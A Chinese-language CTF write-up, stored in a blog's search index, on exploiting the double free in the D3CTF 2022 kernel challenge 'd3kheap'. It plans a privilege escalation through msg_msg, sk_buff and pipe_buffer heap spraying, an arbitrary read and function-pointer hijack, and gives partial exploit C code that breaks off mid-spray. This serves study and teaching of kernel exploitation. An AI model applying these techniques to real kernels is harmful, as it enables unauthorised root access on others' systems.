<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>利用msg_msg结构体进行提权</title>
      <link href="/2022/09/27/li-yong-msg-msg-jie-gou-ti-jin-xing-ti-quan/"/>
      <url>/2022/09/27/li-yong-msg-msg-jie-gou-ti-jin-xing-ti-quan/</url>
      
        <content type="html"><![CDATA[<p>现实场景中的漏洞比CTF题目更难以利用，通常只有一个UAF，Linux内核中UAF漏洞占比相对较高。我们考虑一种现实场景：在保护全开的情况下，若是给一个内核空间中的double free，大小为xxx，该如何进行利用完成提权？本文会使用一道CTF题目进行分析，使用堆喷的方式，msg_msg配合sk_buff、pipe_buffer等结构完成权限提升。</p><h1 id="题目介绍"><a href="#题目介绍" class="headerlink" title="题目介绍"></a>题目介绍</h1><p>题目来自2022 D3CTF 一道内核PWN，名称为d3kheap（题目下载链接附在文末）。</p><p>和常规内核题目类似，在rootfs中有ko模块，可以使用<code>cpio -idmv</code>解包后提取出文件系统。将ko模块提取出来后，放到IDA中分析逻辑，可以明显的看到一个UAF。<code>ioctl</code>的请求码0x1234和0xdead分别对应分配和释放，但是我们只能使用一次分配功能便无法使用，并且大小是固定的1024，释放的时候可以释放两次，那么这就满足了double free的漏洞条件。具体逻辑如下图：</p><p><img src="https://raw.githubusercontent.com/unrav31/images/master/image-20220927141026513.png" alt="image-20220927141026513"></p><p>基于程序逻辑，现在有了一个构造UAF的思路：</p><ol><li>首先用分配功能分配一个1024大小的内存，这里就称它为kheap</li><li>0xdead功能释放kheap，此时kheap被挂在free list链表上，由内核进行管理</li><li>此时我们应该去调用一个函数，这个函数它会在内核中会分配一块它所用到的结构体大小的内存，如果这个堆块大小刚好等于kheap的大小，那么由于LIFO的原则，极大可能将kheap重新申请出来。此时我们还可以对kheap进行一次释放，那么就构成了一个UAF</li></ol><p>关键在于我们应该调用哪个函数？应该使用什么结构体？并且这个结构体大小刚好会分配1024，而且便于我们利用？答案就是<code>msg_msg</code>结构体，这个结构体由<code>msgsnd</code>和<code>msgrcv</code>系统调用来分配和回收，大小是可控的，0x30~0x1000之间都可以进行分配，很容易满足我们的要求。</p><h1 id="msg-msg结构体的分配和回收"><a href="#msg-msg结构体的分配和回收" class="headerlink" title="msg_msg结构体的分配和回收"></a>msg_msg结构体的分配和回收</h1><p>接下来需要了解一下<code>msg_msg</code>结构体它分配和回收的过程。简单介绍一下msg_msg相关函数：</p><ul><li><code>msgget</code>：创建一个消息队列，返回一个int类型，类似描述符，之后相关操作都需要这个返回值</li><li><code>msgsnd</code>：向指定消息队列发送消息，内核将用户数据复制到内核</li><li><code>msgrcv</code>：从指定消息队列接接收消息，内核将内核数据复制给用户</li></ul><p>msg_msg结构体到底长啥样？它定义于include&#x2F;linux&#x2F;msg.h：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token comment">/* one msg_msg structure for each message */</span><span class="token keyword">struct</span> <span class="token class-name">msg_msg</span> <span class="token punctuation">&#123;</span><span class="token keyword">struct</span> <span class="token class-name">list_head</span> m_list<span class="token punctuation">;</span><span class="token keyword">long</span> m_type<span class="token punctuation">;</span><span class="token class-name">size_t</span> m_ts<span class="token punctuation">;</span><span class="token comment">/* message text size */</span><span class="token keyword">struct</span> <span class="token class-name">msg_msgseg</span> <span class="token operator">*</span>next<span class="token punctuation">;</span><span class="token keyword">void</span> <span class="token operator">*</span>security<span class="token punctuation">;</span><span class="token comment">/* the actual message follows immediately */</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>第一个成员<code>m_list</code>其实就是俩指针组成的结构体，一个next，一个prev，总共占用两个字长，其实对链表熟悉的话一看就知道是个链表。msg_msg这个结构体算下来总共占用0x30字节，这其实就是<code>msgsnd</code>和<code>msgrcv</code>操作的消息头，消息头之后的内容才是用户消息内容。其中我们要利用的是<code>m_ts</code>成员，它存储用户消息长度，如何利用稍后会讲。</p><p>msg_msg结构体有一个特性：</p><ul><li><p>如果用户消息长度加上消息头0x30小于一页，那么会在页内进行分配，<code>next</code>成员为NULL</p></li><li><p>如果用户消息长度加上消息头大于一页0x1000，那么这些消息被分为两部分，第一部分包含消息头和用户消息的上部分，直到填满一页。用户消息的第二部分存储在另一片内存中，保存剩余的信息，但不再包含消息头，取而代之的是<code>msg_msgseg</code>结构体，占用8字节，定义如下：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">struct</span> <span class="token class-name">msg_msgseg</span> <span class="token punctuation">&#123;</span><span class="token keyword">struct</span> <span class="token class-name">msg_msgseg</span> <span class="token operator">*</span>next<span class="token punctuation">;</span><span class="token comment">/* the next part of the message follows immediately */</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>第一部分消息头中的<code>next</code>成员保存这片内存的指针，形成一个单链表。如下图：</p><p><img src="https://raw.githubusercontent.com/unrav31/images/master/image-20220927114336266.png" alt="image-20220927114336266"></p></li><li><p>消息结构体大小最大值由&#x2F;proc&#x2F;sys&#x2F;kernel&#x2F;msgmax确定，默认是8192，所以默认最多链接3个成员</p></li></ul><p>综合以上信息，现在有了另一个思路：</p><p>首先想到的是，我们在分配msg_msg的时候，可以控制它的大小刚好为0x400，然后分配到我们的kheap上做一些其他操作。但是仔细想想就知道不行，因为msg_msg头部我们不可控，也没有办法进行修改。另外一种操作就是我们分配超出一页大小的msg_msg结构，那么此时<code>next</code>指向另外一部分我们的数据内容，另一部分由于没有0x30的消息头，所以是我们可控的，这样的话我们只要控制好msg_msg的大小，让他超出一页后，另一部分刚好等于1024大小，就会把kheap分配回去。</p><p>但是，msg_msg结构存储的几个成员只能泄露堆地址，不足以泄露内核基址，所以我们还需要另外想一些办法，找到一些存储内核地址的结构体，占用释放掉的msg_msg后把它读出来完成泄露。</p><h1 id="sk-buff结构体利用"><a href="#sk-buff结构体利用" class="headerlink" title="sk_buff结构体利用"></a>sk_buff结构体利用</h1><p><code>sk_buff</code>是Linux内核网络协议栈用到的结构体，它可以表示网络协议栈传输的一个包，但他本身不包含数据部分，数据存储在一个单独的对象中。定义在 include&#x2F;linux&#x2F;skbuff.h中，由于结构体比较复杂，这里取关健的成员进行展示：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">struct</span> <span class="token class-name">sk_buff</span> <span class="token punctuation">&#123;</span><span class="token keyword">union</span> <span class="token punctuation">&#123;</span><span class="token keyword">struct</span> <span class="token punctuation">&#123;</span><span class="token comment">/* These two members must be first. */</span><span class="token keyword">struct</span> <span class="token class-name">sk_buff</span><span class="token operator">*</span>next<span class="token punctuation">;</span><span class="token keyword">struct</span> <span class="token class-name">sk_buff</span><span class="token operator">*</span>prev<span class="token punctuation">;</span><span class="token comment">// ...</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token comment">// ...</span><span class="token comment">/* These elements must be at the end, see alloc_skb() for details.  */</span><span class="token class-name">sk_buff_data_t</span>tail<span class="token punctuation">;</span><span class="token class-name">sk_buff_data_t</span>end<span class="token punctuation">;</span><span class="token keyword">unsigned</span> <span class="token keyword">char</span><span class="token operator">*</span>head<span class="token punctuation">,</span><span class="token operator">*</span>data<span class="token punctuation">;</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span>truesize<span class="token punctuation">;</span><span class="token class-name">refcount_t</span>users<span class="token punctuation">;</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">ifdef</span> <span class="token expression">CONFIG_SKB_EXTENSIONS</span></span><span class="token comment">/* only useable after checking ->active_extensions != 0 */</span><span class="token keyword">struct</span> <span class="token class-name">skb_ext</span><span class="token operator">*</span>extensions<span class="token punctuation">;</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">endif</span></span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>sk_buff</code>结构体与其所表示的数据包形成如下结构，其中：</p><ul><li><code>head</code> ：一个数据包<strong>实际的起始处</strong>（也就是为该数据包分配的 object 的首地址）</li><li><code>end</code> ：一个数据包实际的末尾（为该数据包分配的 object 的末尾地址）</li><li><code>data</code> ：<strong>当前所在 layer 的数据包对应的起始地址</strong></li><li><code>tail</code> ：<strong>当前所在 layer 的数据包对应的末尾地址</strong></li></ul><p>多个sk_buff形成双链表结构，类似于上面的msg队列。sk_buff中存在<code>skb_shared_info</code>结构体，定义在 include&#x2F;linux&#x2F;skbuff.h 中，它占用320字节，这意味着我们在进行构造的时候最小也需要是512大小的堆块。</p><p>最简单的方式就是使用<code>socketpair</code>系统调用来创建一对socket，通过<code>read</code>和<code>write</code>函数向socketpair读取或写入来控制分配、释放sk_buff。利用这个结构体其实跟msg_msg效果类似，只是sk_buff更像是一个“菜单堆”，方便分配和释放。</p><h1 id="pipe-buffer结构体"><a href="#pipe-buffer结构体" class="headerlink" title="pipe_buffer结构体"></a>pipe_buffer结构体</h1><p>当我们创建一个管道时，在内核中会生成数个连续的 <code>pipe_buffer</code>结构体，申请的内存总大小刚好会让内核从 kmalloc-1k 中取出一个 object，结构体定义于 includ&#x2F;linux&#x2F;pipe_fs_i.h 中：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">struct</span> <span class="token class-name">pipe_buffer</span> <span class="token punctuation">&#123;</span><span class="token keyword">struct</span> <span class="token class-name">page</span> <span class="token operator">*</span>page<span class="token punctuation">;</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span> offset<span class="token punctuation">,</span> len<span class="token punctuation">;</span><span class="token keyword">const</span> <span class="token keyword">struct</span> <span class="token class-name">pipe_buf_operations</span> <span class="token operator">*</span>ops<span class="token punctuation">;</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span> flags<span class="token punctuation">;</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span> private<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>其中 <code>pipe_buf_operations</code> 成员通常指向一张全局函数表，因此可以用于泄露内核代码段地址。定义如下：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">struct</span> <span class="token class-name">pipe_buf_operations</span> <span class="token punctuation">&#123;</span><span class="token keyword">int</span> <span class="token punctuation">(</span><span class="token operator">*</span>confirm<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">pipe_inode_info</span> <span class="token operator">*</span><span class="token punctuation">,</span> <span class="token keyword">struct</span> <span class="token class-name">pipe_buffer</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">void</span> <span class="token punctuation">(</span><span class="token operator">*</span>release<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">pipe_inode_info</span> <span class="token operator">*</span><span class="token punctuation">,</span> <span class="token keyword">struct</span> <span class="token class-name">pipe_buffer</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">bool</span> <span class="token punctuation">(</span><span class="token operator">*</span>try_steal<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">pipe_inode_info</span> <span class="token operator">*</span><span class="token punctuation">,</span> <span class="token keyword">struct</span> <span class="token class-name">pipe_buffer</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">bool</span> <span class="token punctuation">(</span><span class="token operator">*</span>get<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">pipe_inode_info</span> <span class="token operator">*</span><span class="token punctuation">,</span> <span class="token keyword">struct</span> <span class="token class-name">pipe_buffer</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>pipe_buffer的分配是通过 <code>pipe</code>和<code>pipe2</code>两个系统调用来完成的，<code>pipe2</code>相对于<code>pipe</code>多了一个flag参数，无关紧要，他们分配的大小都是1k。释放时可以直接使用close函数关闭管道即可。</p><p>pipe_buffer还可以用于控制流劫持。当我们关闭管道时，会执行<code>pipe_buffer-&gt;pipe_buffer_operations-&gt;release</code>这一函数，因此我们只需要劫持其函数表到可控区域后再关闭管道的两端便能劫持内核执行流。</p><h1 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h1><p>综合以上信息，对利用过程进行梳理：</p><ol><li>首先做一些初始化工作</li><li>使用分配功能分配一个堆块kheap，堆喷msg_msg结构体，中途释放kheap，保证后面分配的msg_msg结构体占用这块内存</li><li>第二次释放kheap，然后堆喷sk_buff结构体，使用<code>msgrcv</code>读取所有socketpair，可设置<code>MSG_COPY</code>标志位防止unlink而导致的内核崩溃。由于msg_msg结构体被改变，当<code>msgrcv</code>失败时表示命中kheap，然后释放掉所有的sk_buff，让kheap重新进入free list</li><li>再次堆喷sk_buff结构体，修改<code>m_ts</code>的值，根据<code>m_ts</code>的大小进行读取时，则会发生越界访问</li><li>伪造<code>msg_msg-&gt; next</code>成员，达到任意地址读取</li><li>有了任意地址读取后喷射<code>pipe_buffer</code>，读出<code>pipe_buf_operations</code>，泄露内核基址</li><li>最后劫持<code>pipe_buf_operations -&gt; release</code>函数指针，完成控制流劫持，构造ROP提权，返回用户态起shell</li></ol><h1 id="构造利用脚本"><a href="#构造利用脚本" class="headerlink" title="构造利用脚本"></a>构造利用脚本</h1><ol><li>首先我们做一些初始化工作，保存用户态寄存器，绑定单核，创建socketpair，并打开设备文件：</li></ol><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">SOCKET_NUM</span> <span class="token expression"><span class="token number">16</span></span></span><span class="token class-name">size_t</span> user_cs<span class="token punctuation">,</span> user_ss<span class="token punctuation">,</span> user_sp<span class="token punctuation">,</span> user_rflags<span class="token punctuation">;</span><span class="token comment">// 保存用户态寄存器，退出内核态时使用</span><span class="token keyword">void</span> <span class="token function">saveStatus</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">__asm__</span><span class="token punctuation">(</span><span class="token string">"mov user_cs, cs;"</span>            <span class="token string">"mov user_ss, ss;"</span>            <span class="token string">"mov user_sp, rsp;"</span>            <span class="token string">"pushf;"</span>            <span class="token string">"pop user_rflags;"</span>            <span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\033[34m\033[1m[*] Status has been saved.\033[0m\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">long</span> dev_fd<span class="token punctuation">;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>envp<span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token class-name">cpu_set_t</span>   cpu_set<span class="token punctuation">;</span><span class="token keyword">int</span>         sk_sockets<span class="token punctuation">[</span>SOCKET_NUM<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token comment">// 绑定单核</span>    <span class="token function">CPU_ZERO</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>cpu_set<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">CPU_SET</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>cpu_set<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">sched_setaffinity</span><span class="token punctuation">(</span><span class="token function">getpid</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>cpu_set<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>cpu_set<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 创建16对socketpair，描述符存在sk_sockets数组中</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> SOCKET_NUM<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">socketpair</span><span class="token punctuation">(</span>AF_UNIX<span class="token punctuation">,</span> SOCK_STREAM<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> sk_sockets<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span>            <span class="token function">errExit</span><span class="token punctuation">(</span><span class="token string">"failed to create socket pair!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        dev_fd <span class="token operator">=</span> <span class="token function">open</span><span class="token punctuation">(</span><span class="token string">"/dev/d3kheap"</span><span class="token punctuation">,</span> O_RDONLY<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ol start="2"><li>接下来创建msg_msg消息队列，使用模块分配功能分配一个0x400大小的堆块，然后我们喷射0x60和0x400大小的消息结构，在中途使用一次释放功能，使后续0x400消息结构能占用这块内存：</li></ol><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">MSG_QUEUE_NUM</span> <span class="token expression"><span class="token number">4096</span></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">PRIMARY_MSG_SIZE</span> <span class="token expression"><span class="token number">96</span></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">SECONDARY_MSG_SIZE</span> <span class="token expression"><span class="token number">0x400</span></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">MSG_TAG</span>     <span class="token expression"><span class="token number">0xAAAAAAAA</span></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">OBJ_ADD</span>     <span class="token expression"><span class="token number">0x1234</span></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">OBJ_DEL</span>     <span class="token expression"><span class="token number">0xdead</span></span></span><span class="token comment">// 链表结构</span><span class="token keyword">struct</span> <span class="token class-name">list_head</span><span class="token punctuation">&#123;</span>    <span class="token class-name">uint64_t</span>    next<span class="token punctuation">;</span>    <span class="token class-name">uint64_t</span>    prev<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token comment">// msg_msg 信息头部结构体</span><span class="token keyword">struct</span> <span class="token class-name">msg_msg</span><span class="token punctuation">&#123;</span>    <span class="token keyword">struct</span> <span class="token class-name">list_head</span> m_list<span class="token punctuation">;</span>    <span class="token class-name">uint64_t</span>    m_type<span class="token punctuation">;</span>    <span class="token class-name">uint64_t</span>    m_ts<span class="token punctuation">;</span>    <span class="token class-name">uint64_t</span>    next<span class="token punctuation">;</span>    <span class="token class-name">uint64_t</span>    security<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token comment">// 主消息大小0x60</span><span class="token keyword">struct</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">long</span> mtype<span class="token punctuation">;</span>    <span class="token keyword">char</span> mtext<span class="token punctuation">[</span>PRIMARY_MSG_SIZE <span class="token operator">-</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">msg_msg</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>primary_msg<span class="token punctuation">;</span><span class="token comment">// 副消息大小0x400</span><span class="token keyword">struct</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">long</span> mtype<span class="token punctuation">;</span>    <span class="token keyword">char</span> mtext<span class="token punctuation">[</span>SECONDARY_MSG_SIZE <span class="token operator">-</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">msg_msg</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>secondary_msg<span class="token punctuation">;</span><span class="token comment">// 错误处理函数</span><span class="token keyword">void</span> <span class="token function">errExit</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span>msg<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\033[31m\033[1m[x] Error: %s\033[0m\n"</span><span class="token punctuation">,</span> msg<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">exit</span><span class="token punctuation">(</span>EXIT_FAILURE<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">// msgsnd发送消息，将用户数据发送到内核</span><span class="token keyword">int</span> <span class="token function">writeMsg</span><span class="token punctuation">(</span><span class="token keyword">int</span> msqid<span class="token punctuation">,</span> <span class="token keyword">void</span> <span class="token operator">*</span>msgp<span class="token punctuation">,</span> <span class="token class-name">size_t</span> msgsz<span class="token punctuation">,</span> <span class="token keyword">long</span> msgtyp<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">long</span><span class="token operator">*</span><span class="token punctuation">)</span>msgp <span class="token operator">=</span> msgtyp<span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token function">msgsnd</span><span class="token punctuation">(</span>msqid<span class="token punctuation">,</span> msgp<span class="token punctuation">,</span> msgsz <span class="token operator">-</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">long</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">ioctl</span><span class="token punctuation">(</span>dev_fd<span class="token punctuation">,</span> OBJ_ADD<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token function">del</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">ioctl</span><span class="token punctuation">(</span>dev_fd<span class="token punctuation">,</span> OBJ_DEL<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>envp<span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token keyword">int</span>         msqid<span class="token punctuation">[</span>MSG_QUEUE_NUM<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token comment">/*     * Step.1     * msgget 创建 msg 队列     * 使用模块功能添加一个0x400大小堆块     * 喷射msg_msg结构，每次都发送两条消息，一条0x60大小，另一条0x400大小     * 当循环到中途时释放掉之前添加的0x400，之后msgsnd时有极大几率分配到此chunk     */</span>    <span class="token comment">// 创建4096个消息队列</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> MSG_QUEUE_NUM<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>msqid<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">msgget</span><span class="token punctuation">(</span>IPC_PRIVATE<span class="token punctuation">,</span> <span class="token number">0666</span> <span class="token operator">|</span> IPC_CREAT<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span>            <span class="token function">errExit</span><span class="token punctuation">(</span><span class="token string">"failed to create msg_queue!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">// 初始化主消息和副消息</span>    <span class="token function">memset</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>primary_msg<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>primary_msg<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">memset</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>secondary_msg<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>secondary_msg<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// 使用模块功能分配0x400堆块</span>    <span class="token function">add</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// 喷射0x60和0x400堆块，在中途释放掉模块申请的0x400,使后续的副消息堆块进行占用，那么这个堆块内容就是我们可控的了</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> MSG_QUEUE_NUM<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">int</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>primary_msg<span class="token punctuation">.</span>mtext<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> MSG_TAG<span class="token punctuation">;</span>        <span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">int</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>primary_msg<span class="token punctuation">.</span>mtext<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">=</span> i<span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">writeMsg</span><span class="token punctuation">(</span>msqid<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>primary_msg<span class="token punctuation">,</span>                 <span class="token keyword">sizeof</span><span class="token punctuation">(</span>primary_msg<span class="token punctuation">)</span><span class="token punctuation">,</span> PRIMARY_MSG_TYPE<span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span>            <span class="token function">errExit</span><span class="token punctuation">(</span><span class="token string">"failed to send primary msg!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">int</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>secondary_msg<span class="token punctuation">.</span>mtext<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> MSG_TAG<span class="token punctuation">;</span>        <span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">int</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>secondary_msg<span class="token punctuation">.</span>mtext<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">=</span> i<span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">writeMsg</span><span class="token punctuation">(</span>msqid<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>secondary_msg<span class="token punctuation">,</span>                 <span class="token keyword">sizeof</span><span class="token punctuation">(</span>secondary_msg<span class="token punctuation">)</span><span class="token punctuation">,</span> SECONDARY_MSG_TYPE<span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span>            <span class="token function">errExit</span><span class="token punctuation">(</span><span class="token string">"failed to send secondary msg!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span>i <span class="token operator">==</span> 